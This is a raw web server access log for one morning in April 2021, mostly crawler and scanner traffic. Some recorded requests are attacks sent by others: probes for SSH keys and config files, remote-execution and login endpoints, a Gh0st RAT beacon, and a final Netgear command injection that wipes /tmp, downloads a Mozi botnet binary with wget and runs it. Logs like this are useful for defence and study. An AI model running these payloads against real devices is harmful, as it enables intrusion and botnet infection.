207.46.13.1 - - [01/Apr/2021:03:53:38 -0700] "GET /robots.txt HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.243 - - [01/Apr/2021:03:53:47 -0700] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
216.218.206.66 - - [01/Apr/2021:04:16:32 -0700] "GET / HTTP/1.1" 404 153 "-" "-"
205.185.122.102 - - [01/Apr/2021:04:29:10 -0700] "GET /config/getuser?index=0 HTTP/1.1" 404 125 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
23.251.148.3 - - [01/Apr/2021:04:39:45 -0700] "GET / HTTP/1.1" 301 169 "-" "python-requests/2.25.1"
42.228.75.198 - - [01/Apr/2021:05:12:33 -0700] "POST /HNAP1/ HTTP/1.0" 404 153 "-" "-"
66.240.205.34 - - [01/Apr/2021:05:12:41 -0700] "Gh0st\xAD\x00\x00\x00\xE0\x00\x00\x00x\x9CKS``\x98\xC3\xC0\xC0\xC0\x06\xC4\x8C@\xBCQ\x96\x81\x81\x09H\x07\xA7\x16\x95e&\xA7*\x04$&g+\x182\x94\xF6\xB000\xAC\xA8rc\x00\x01\x11\xA0\x82\x1F\x5C`&\x83\xC7K7\x86\x19\xE5n\x0C9\x95n\x0C;\x84\x0F3\xAC\xE8sch\xA8^\xCF4'J\x97\xA9\x82\xE30\xC3\x91h]&\x90\xF8\xCE\x97S\xCBA4L?2=\xE1\xC4\x92\x86\x0B@\xF5`\x0CT\x1F\xAE\xAF]" 400 157 "-" "-"
207.46.13.1 - - [01/Apr/2021:05:49:37 -0700] "GET /robots.txt HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
13.66.139.71 - - [01/Apr/2021:05:49:39 -0700] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
47.116.139.19 - - [01/Apr/2021:06:22:15 -0700] "POST /_ignition/execute-solution HTTP/1.1" 404 125 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
47.116.139.19 - - [01/Apr/2021:06:23:15 -0700] "GET /login HTTP/1.1" 404 125 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
47.116.139.19 - - [01/Apr/2021:06:23:16 -0700] "GET /jenkins/login HTTP/1.1" 404 125 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
47.116.139.19 - - [01/Apr/2021:06:23:46 -0700] "GET /wp-login.php HTTP/1.1" 404 125 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
103.58.250.62 - - [01/Apr/2021:06:24:38 -0700] "GET / HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
91.243.46.122 - - [01/Apr/2021:07:01:22 -0700] "GET /.ssh/id_rsa HTTP/1.0" 301 169 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
91.243.46.122 - - [01/Apr/2021:07:15:05 -0700] "GET /parameters.yml HTTP/1.0" 301 169 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
91.243.46.122 - - [01/Apr/2021:07:24:15 -0700] "GET /app/config/parameters.yml HTTP/1.0" 301 169 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
88.5.237.10 - - [01/Apr/2021:07:24:19 -0700] "GET / HTTP/1.1" 404 125 "-" "Mozilla/5.0 zgrab/0.x"
139.162.238.243 - - [01/Apr/2021:07:57:12 -0700] "GET / HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
91.243.46.122 - - [01/Apr/2021:08:04:06 -0700] "GET /app/config/parameters.yml HTTP/1.0" 301 169 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
85.208.22.180 - - [01/Apr/2021:08:11:27 -0700] "GET / HTTP/1.1" 301 169 "-" "CATExplorador/1.0beta (sistemes at domini dot cat; http://domini.cat/catexplorador.html)"
103.15.216.130 - - [01/Apr/2021:09:02:45 -0700] "GET / HTTP/1.1" 301 169 "-" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:45 -0700] "GET / HTTP/1.1" 301 169 "http://www.thecolrc.org" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:46 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:47 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:47 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:48 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:48 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:49 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:49 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:50 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:50 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:51 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:52 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:52 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:53 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:53 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:54 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:54 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:55 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:55 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:56 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:56 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:57 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:57 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:58 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:59 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:02:59 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:03:00 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:03:00 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
103.15.216.130 - - [01/Apr/2021:09:03:01 -0700] "GET / HTTP/1.1" 301 169 "https://www.thecolrc.org/" "GRequests/0.10"
1.82.104.89 - - [01/Apr/2021:09:32:00 -0700] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://1.82.104.89:55626/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 301 169 "-" "-"
